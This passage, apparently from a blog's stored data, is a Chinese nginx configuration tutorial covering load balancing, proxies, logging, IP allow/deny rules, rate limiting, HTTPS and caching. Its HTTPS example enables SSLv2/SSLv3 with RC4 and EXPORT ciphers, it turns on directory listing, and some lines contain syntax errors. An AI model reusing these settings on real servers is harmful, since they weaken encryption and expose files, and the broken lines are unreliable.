on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。\n    #sendfile指令指定 nginx 是否调用sendfile 函数（zero copy 方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。\n    sendfile on;\n\n    #开启目录列表访问，合适下载服务器，默认关闭。\n    autoindex on;\n\n    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用\n    tcp_nopush on;\n\n    tcp_nodelay on;\n\n    #长连接超时时间，单位是秒\n    keepalive_timeout 120;\n\n    #FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。\n    fastcgi_connect_timeout 300;\n    fastcgi_send_timeout 300;\n    fastcgi_read_timeout 300;\n    fastcgi_buffer_size 64k;\n    fastcgi_buffers 4 64k;\n    fastcgi_busy_buffers_size 128k;\n    fastcgi_temp_file_write_size 128k;\n\n    #gzip模块设置\n    gzip on; #开启gzip压缩输出\n    gzip_min_length 1k;    #最小压缩文件大小\n    gzip_buffers 4 16k;    #压缩缓冲区\n    gzip_http_version 1.0;    #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）\n    gzip_comp_level 2;    #压缩等级\n    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。\n    gzip_vary on;\n\n    #开启限制IP连接数的时候需要使用\n    #limit_zone crawler $binary_remote_addr 10m;\n\n\n\n    #负载均衡配置\n    upstream piao.jd.com {\n\n        #upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。\n        server 192.168.80.121:80 weight=3;\n        server 192.168.80.122:80 weight=2;\n        server 192.168.80.123:80 weight=3;\n\n        #nginx的upstream目前支持4种方式的分配\n        #1、轮询（默认）\n        #每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。\n        #2、weight\n        #指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。\n        #例如：\n        #upstream bakend {\n        #    server 192.168.0.14 weight=10;\n        #    server 192.168.0.15 weight=10;\n        #}\n        #2、ip_hash\n        #每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n        #例如：\n        #upstream bakend {\n        #    ip_hash;\n        #    server 192.168.0.14:88;\n        #    server 192.168.0.15:80;\n        #}\n        #3、fair（第三方）\n        #按后端服务器的响应时间来分配请求，响应时间短的优先分配。\n        #upstream backend {\n        #    server server1;\n        #    server server2;\n        #    fair;\n        #}\n        #4、url_hash（第三方）\n        #按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。\n        #例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法\n        #upstream backend {\n        #    server squid1:3128;\n        #    server squid2:3128;\n        #    hash $request_uri;\n        #    hash_method crc32;\n        #}\n\n        #tips:\n        #upstream bakend{#定义负载均衡设备的Ip及设备状态}{\n        #    ip_hash;\n        #    server 127.0.0.1:9090 down;\n        #    server 127.0.0.1:8080 weight=2;\n        #    server 127.0.0.1:6060;\n        #    server 127.0.0.1:7070 backup;\n        #}\n        #在需要使用负载均衡的server中增加 proxy_pass http://bakend/;\n\n        #每个设备的状态设置为:\n        #1.down表示单前的server暂时不参与负载\n        #2.weight为weight越大，负载的权重就越大。\n        #3.max_fails：允许请求失败的次数默认为1.当超过最大次数时，返回proxy_next_upstream模块定义的错误\n        #4.fail_timeout:max_fails次失败后，暂停的时间。\n        #5.backup： 其它所有的非backup机器down或者忙的时候，请求backup机器。所以这台机器压力会最轻。\n\n        #nginx支持同时设置多组的负载均衡，用来给不用的server来使用。\n        #client_body_in_file_only设置为On 可以讲client post过来的数据记录到文件中用来做debug\n        #client_body_temp_path设置记录文件的目录 可以设置最多3层目录\n        #location对URL进行匹配.可以进行重定向或者进行新的代理 负载均衡\n    }\n\n\n\n    #虚拟主机的配置\n    server\n    {\n        #监听端口\n        listen 80;\n\n        #域名可以有多个，用空格隔开\n        server_name www.jd.com jd.com;\n        index index.html index.htm index.php;\n        root /data/www/jd;\n\n        #对******进行负载均衡\n        location ~ .*.(php|php5)?$\n        {\n            fastcgi_pass 127.0.0.1:9000;\n            fastcgi_index index.php;\n            include fastcgi.conf;\n        }\n\n        #图片缓存时间设置\n        location ~ .*.(gif|jpg|jpeg|png|bmp|swf)$\n        {\n            expires 10d;\n        }\n\n        #JS和CSS缓存时间设置\n        location ~ .*.(js|css)?$\n        {\n            expires 1h;\n        }\n\n        #日志格式设定\n        #$remote_addr与$http_x_forwarded_for用以记录客户端的ip地址；\n        #$remote_user：用来记录客户端用户名称；\n        #$time_local： 用来记录访问时间与时区；\n        #$request： 用来记录请求的url与http协议；\n        #$status： 用来记录请求状态；成功是200，\n        #$body_bytes_sent ：记录发送给客户端文件主体内容大小；\n        #$http_referer：用来记录从那个页面链接访问过来的；\n        #$http_user_agent：记录客户浏览器的相关信息；\n        #通常web服务器放在反向代理的后面，这样就不能获取到客户的IP地址了，通过$remote_add拿到的IP地址是反向代理服务器的iP地址。反向代理服务器在转发请求的http头信息中，可以增加x_forwarded_for信息，用以记录原有客户端的IP地址和原来客户端的请求的服务器地址。\n        log_format access '$remote_addr - $remote_user [$time_local] \"$request\" '\n        '$status $body_bytes_sent \"$http_referer\" '\n        '\"$http_user_agent\" $http_x_forwarded_for';\n\n        #定义本虚拟主机的访问日志\n        access_log  /usr/local/nginx/logs/host.access.log  main;\n        access_log  /usr/local/nginx/logs/host.access.404.log  log404;\n\n        #对 \"/\" 启用反向代理\n        location / {\n            proxy_pass http://127.0.0.1:88;\n            proxy_redirect off;\n            proxy_set_header X-Real-IP $remote_addr;\n\n            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n            #以下是一些反向代理的配置，可选。\n            proxy_set_header Host $host;\n\n            #允许客户端请求的最大单文件字节数\n            client_max_body_size 10m;\n\n            #缓冲区代理缓冲用户端请求的最大字节数，\n            #如果把它设置为比较大的数值，例如256k，那么，无论使用firefox还是IE浏览器，来提交任意小于256k的图片，都很正常。如果注释该指令，使用默认的client_body_buffer_size设置，也就是操作系统页面大小的两倍，8k或者16k，问题就出现了。\n            #无论使用firefox4.0还是IE8.0，提交一个比较大，200k左右的图片，都返回500 Internal Server Error错误\n            client_body_buffer_size 128k;\n\n            #表示使nginx阻止HTTP应答代码为400或者更高的应答。\n            proxy_intercept_errors on;\n\n            #后端服务器连接的超时时间_发起握手等候响应超时时间\n            #nginx跟后端服务器连接超时时间(代理连接超时)\n            proxy_connect_timeout 90;\n\n            #后端服务器数据回传时间(代理发送超时)\n            #后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据\n            proxy_send_timeout 90;\n\n            #连接成功后，后端服务器响应时间(代理接收超时)\n            #连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）\n            proxy_read_timeout 90;\n\n            #设置代理服务器（nginx）保存用户头信息的缓冲区大小\n            #设置从被代理服务器读取的第一部分应答的缓冲区大小，通常情况下这部分应答中包含一个小的应答头，默认情况下这个值的大小为指令proxy_buffers中指定的一个缓冲区的大小，不过可以将其设置为更小\n            proxy_buffer_size 4k;\n\n            #proxy_buffers缓冲区，网页平均在32k以下的设置\n            #设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k\n            proxy_buffers 4 32k;\n\n            #高负荷下缓冲大小（proxy_buffers*2）\n            proxy_busy_buffers_size 64k;\n\n            #设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长\n            #设定缓存文件夹大小，大于这个值，将从upstream服务器传\n            proxy_temp_file_write_size 64k;\n        }\n\n\n        #设定查看Nginx状态的地址\n        location /NginxStatus {\n            stub_status on;\n            access_log on;\n            auth_basic \"NginxStatus\";\n            auth_basic_user_file confpasswd;\n            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生。\n        }\n\n        #本地动静分离反向代理配置\n        #所有jsp的页面均交由tomcat或resin处理\n        location ~ .(jsp|jspx|do)?$ {\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_pass http://127.0.0.1:8080;\n        }\n\n        #所有静态文件由nginx直接读取不经过tomcat或resin\n        location ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|\n        pdf|xls|mp3|wma)$\n        {\n            expires 15d;\n        }\n\n        location ~ .*.(js|css)?$\n        {\n            expires 1h;\n        }\n    }\n}\n######Nginx配置文件nginx.conf中文详解#####\n```\n</details>\n\n## 1.全局块\n\n全局块是默认配置文件从开始到events块之间的一部分内容，主要设置一些影响Nginx服务器整体运行的配置指令，作用域是Nginx服务器全局。<br>\n通常包含配置运行Nginx服务器的用户（组）、允许生成的worker process数，Nginx进程PID存放路径、日志的存放路径和类型以及配置文件引入等。<br>\n\n## 2.events块\n\nevents块设计的指令主要影响Nginx服务器与用户的网络连接。常用到的设置包括是选取哪种事件驱动模型处理连接请求，每个worker process可以同时支持的最大连接数等。<br>\n这一部分的指令对Nginx服务器的性能影响较大，在实际配置中应该根据实际情况灵活调整。<br>\n\n```\nevents {\n    # epoll linux下的高效工作模型首选\n    use epoll;\n\n    #worker_connections用于定义Nginx每个进程的最大连接数\n    # 即接收前端的最大请求数\n    worker_connections  1024;\n}\n```\n\n\n## 3.http块\n\nhttp块是Nginx服务器配置中的重要部分，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个模块中。<br>\nhttp块中可以包含自己的全局块，也可以包含server块，server块中又进一步包含location块。<br>\n可以在http全局块中配置的指令包括文件引入、MIME-Type定义、日志自定义、是否使用sendfile传输文件、连接超时时间、单请求数上线等。\n\n\n### 3.1 http全局\n\n```\nhttp\n{\n    #文件扩展名与文件类型映射表 mime(多用途因特网邮件扩展)\n    include mime.types;\n\n    #默认文件类型\n    default_type application/octet-stream;\n\n    #默认编码\n    charset utf-8;\n\n    #设定通过nginx上传文件的大小\n    client_max_body_size 8m;\n\n    #开启高效文件传输模式\n    sendfile on;\n\n    #开启目录列表访问，合适下载服务器，默认关闭。\n    autoindex on;\n\n    #此选项允许或禁止使用socke的TCP_CORK的选项，此选项仅在使用sendfile的时候使用\n    tcp_nopush on;\n    tcp_nodelay on;\n\n    #长连接超时时间，单位是秒\n    keepalive_timeout 120;\n\n    #gzip模块设置\n    gzip on; #开启gzip压缩输出\n    gzip_min_length 1k;    #最小压缩文件大小\n    gzip_buffers 4 16k;    #压缩缓冲区\n    gzip_http_version 1.0;    #压缩版本\n    gzip_comp_level 2;    #压缩等级\n    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型，默认就已经包含textml\n    gzip_vary on;\n\n    #开启限制IP连接数的时候需要使用\n    #limit_zone crawler $binary_remote_addr 10m;\n\n}\n```\n\n### 3.2 server\n\n每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供一组服务<br>\n\n#### 3.2.1  server全局\n\n```\nserver {\n        #监听的端口\n        listen       8080;\n\n        #用来指定IP地址或者域名，多个域名之间用空格分开， 可以通配符 *.test.com\n        server_name  localhost 192.168.12.10 www.yangyi.com;\n\n        #根目录\n        #root   /Users/yangyi/www;\n        #初始页面 自左向右匹配\n        #index  index.php index.html index.htm;\n\n        charset utf-8;\n\n        #日志路径与级别\n        access_log  usr/local/var/log/host.access.log  main;\n        aerror_log  usr/local/var/log/host.error.log  error;\n\n\n}\n```\n\n#### 3.2.2 upstream\n\n定义服务集群，用于负载均衡.<br>\n\n#### 3.2.3 location\n\nlocation块的主要作用是，基于Nginx服务器接收到的请求字符串进行匹配，对特定的请求进行处理<br>\n\n <strong> location [=|\\~|\\~\\*|^~|@] /uri/ { … } </strong>\n\n location 可分两大类：\n\n - 普通 location<br>\n\n\n 以 “ = ” 或 “ ^~ ”为前缀或者没有任何前缀的 /uri/\n\n - 正则 location\n\n以 “ ~ ” 或 “ ~* ”为前缀的 /uri/, 即以  ~ 开头的<br>\n正则的意义是，url中可以使用正则<br>\n\n\n=：表示完全匹配，不存在正则表示，如 location = /uri {.....}\n\n~：表示匹配时，大小写敏感的，如 location ~ /uri {.....} \n\n~\\*：表示匹配时，大小写不敏感，即忽略大小写问题，如 location ~* /uri {......}，这时/uri，/Uri， /URI都可以匹配上。\n\n^\\~：表示匹配时，只需开头部分匹配上即可，如 location ^~ /uri/ {....}  ，这时只要以/uri/开头的地址都会匹配上<br>\n\n<strong>location详细讲解参考 location模块.md</strong>\n\n\n# 三.其它\n\n## 1.nginx限制访问ip\n\n黑白名单\n\n```\n# 服务器全局限制\nallow 67.216.218.37;\ndeny all;\n\n# location中限制\nlocation / {\n    index index.html index.htm index.php;\n    allow 67.216.218.37;\n    deny all;\n}\n```\n\n- 注意:<br>\n\n可以使用IP段<br>\n从允许访问的段位从小到大排列,如127.0.0.0/24 下面才能是10.10.0.0/16<br>\ndeny all; 结尾 表示除了上面allow的其他都禁止<br>\n\ndeny 192.168.1.1;<br>\nallow 127.0.0.0/24;<br>\nallow 192.168.0.0/16;<br>\nallow 10.10.0.0/16;<br>\ndeny all;<br>\n\n## 2.限制下载速度\n\n限速\n\n```\nlocation /download {\n       # 10m之前不限速\n       limit_rate_after 10m;\n       limit_rate 128k;\n }  \n```\n\n## 3.限制ip访问频率\n\n防攻击\n\n- limit_req_zone\n\n这个变量只能在http使用\n```\nhttp{\n  ...\n  #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，\n  #以$binary_remote_addr 为key,限制平均每秒的请求为5个，\n  #1M能存储16000个状态，rete的值必须为整数，\n  #如果限制两秒钟一个请求，可以设置成30r/m\n\n  limit_req_zone $binary_remote_addr zone=allips:10m rate=5r/s;\n  ...\n\n```\n\n- limit_req\n\n```\n...\n  server{\n    ...\n    location {\n      ...\n      #限制每ip每秒不超过20个请求，漏桶数burst为5\n      #brust的意思就是，如果第1秒、2,3,4秒请求为19个，\n      #第5秒的请求为25个是被允许的。\n      #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。\n      #nodelay，如果不设置该选项，严格使用平均速率限制请求数，\n      #第1秒25个请求时，5个请求放到第2秒执行，\n      #设置nodelay，25个请求将在第1秒执行。\n\n      limit_req zone=allips burst=5 nodelay;\n      ...\n    }\n    ...\n  }\n  ...\n```\n\n## 4.https代理\n\n配置 SSL 将 http 代理到 https\n\n```\n#原80端口做301转跳\nserver {\n    listen 80;\n    server_name w3cschool.cn www.w3cschool.cn;\n    return 301 https://www.zhimiyun.com$request_uri;    #跳转到Https\n}\n#配置ssl证书和开启ssl功能\nserver {\n    listen       443;\n    server_name  www.w3cschool.cn;\n    root   wwwroot;\n    index  index.html index.htm;\n\n    ssl                  on;\n    ssl_certificate      /usr/ssl/ca.pem; #证书地址\n    ssl_certificate_key  /usr/ssl/ca.key;\n\n    ssl_session_timeout  5m;\n\n    ssl_protocols  SSLv2 SSLv3 TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers  ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;\n    ssl_prefer_server_ciphers   on;\n    error_page 497 \"https://$host$uri?$args\"; #这是跳转Http请求到Https\n\n    location / {\n        ...\n    }\n}\n```\n\n## 5.静态资源缓存\n\n对于站点中不经常修改的静态内容（如图片，JS，CSS），可以设置静态资源缓存，控制浏览器缓存，达到有效减小带宽流量，降低服务器压力。\n\n```\nlocation ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ {\n#过期时间为30天，\n#图片文件不怎么更新，过期可以设大一点，\n#如果频繁更新，则可以设置得小一点。\nexpires 30d;\n}\n\nlocation ~ .*\\.(js|css)$ {\nexpires 10d;\n}\n```\n","slug":"tools/nginx/nginx实际问题","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321m8005p6dcpio37yrze","content":"<h1 id=\"一-nginx使用场景\"><a href=\"#一-nginx使用场景\" class=\"headerlink\" title=\"一.nginx使用场景\"></a>一.nginx使用场景</h1><ul>\n<li>负载均衡</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream test &#123;</span><br><span class=\"line\">    server localhost:8080 weight=9;</span><br><span class=\"line\">    server localhost:8081 weight=1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>RR（默认，按时间顺序分配）<br></p>\n<p>权重<br></p>\n<p>ip_hash<br></p>\n<ul>\n<li>正向代理</li>\n</ul>\n<p>访问一些访问不到的资源<br><br>同时可以隐藏自己<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">resolver 114.114.114.114 8.8.8.8;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    resolver_timeout 5s;</span><br><span class=\"line\"></span><br><span class=\"line\">    listen 81;</span><br><span class=\"line\">    access_log  e:/wwwrootproxy.access.log;</span><br><span class=\"line\">    error_log   e:/wwwrootproxy.error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://$host$request_uri;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>反向代理</li>\n</ul>\n<p>让资源能被别人访问到<br><br>同时可以保护内网安全<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 8080;</span><br><span class=\"line\">    server_name localhost;</span><br><span class=\"line\">    location /tomcat1/ &#123;</span><br><span class=\"line\">            proxy_pass http://67.216.XX.xx:8002/test/;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location /tomcat2/ &#123;</span><br><span class=\"line\">            proxy_pass http://67.216.xx.xx:8012/test/;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>资源服务器</li>\n</ul>\n<p>nginx可以作为静态资源服务器，实现动静分离.<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">    sendfile on;</span><br><span class=\"line\">    tcp_nopush on;</span><br><span class=\"line\">    tcp_nodelay on;</span><br><span class=\"line\">    keepalive_timeout 65;</span><br><span class=\"line\">    types_hash_max_size 2048;</span><br><span class=\"line\"></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">         listen       8000;</span><br><span class=\"line\">         server_name  localhost;</span><br><span class=\"line\">         location / &#123;</span><br><span class=\"line\">             root   html;</span><br><span class=\"line\">             index  index.html index.htm;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">         //访问地址</span><br><span class=\"line\">         location /file/ &#123;</span><br><span class=\"line\">            //文件路径</span><br><span class=\"line\">             alias   /home/xiong/file/;</span><br><span class=\"line\">             autoindex on;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"二-nginx配置文件\"><a href=\"#二-nginx配置文件\" class=\"headerlink\" title=\"二. nginx配置文件\"></a>二. nginx配置文件</h1><details><br><summary><br>nginx.conf<br></summary><br>资源地址: <a href=\"https://blog.csdn.net/li_adou/article/details/78178478\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/li_adou/article/details/78178478</a><br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span 